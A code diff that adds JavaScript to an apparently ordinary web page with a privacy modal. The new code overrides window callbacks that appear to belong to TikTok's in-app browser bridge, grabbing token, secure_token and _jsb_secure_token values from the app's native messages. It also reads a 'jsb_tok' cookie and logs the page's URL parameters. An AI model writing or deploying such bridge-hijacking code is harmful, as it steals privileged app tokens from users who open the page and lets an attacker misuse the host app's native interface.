@@ -213,6 +213,28 @@ function closePrivacy(){document.getElementById('privacyModal').classList.remove
   var CID = 1869709729112081;
   try { var _uid = new URLSearchParams(window.location.search).get('utm_id'); if(_uid) CID = parseInt(_uid); } catch(e){}
   var fsUrl = 'https://thaiadvice.net/page.html?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
+
+  // Log all URL params TikTok passes
+  try { var qs=window.location.search; log('url:'+qs.substring(0,200)); } catch(e){}
+
+  // Try to get token from cookie set by bio.thaiadvice.net
+  function getCookieTok(){try{var m=document.cookie.match(/jsb_tok=([^;]+)/);return m?decodeURIComponent(m[1]):null;}catch(e){return null;}}
+  token = getCookieTok();
+  if(token) log('tok from cookie: yes');
+
+  // Also hook window-level callbacks (IESPiper responses may come here)
+  ['_handleMessageFromToutiao','_handleMessageFromApp','_handleMessageFromNative'].forEach(function(fn){
+    window[fn]=function(msg){
+      var s=(typeof msg==='string'?msg:JSON.stringify(msg)).substring(0,300);
+      log('win.'+fn+':'+s);
+      try{
+        var d=typeof msg==='string'?JSON.parse(msg):msg;
+        var tok=d&&(d.token||d.secure_token||d._jsb_secure_token||(d.data&&d.data.token));
+        if(tok&&!token){token=tok;log('WIN TOKEN');}
+      }catch(e){}
+    };
+  });
+
   log('cid='+CID);
 
   // Try to get token via IESPiper getConfig (bare format)
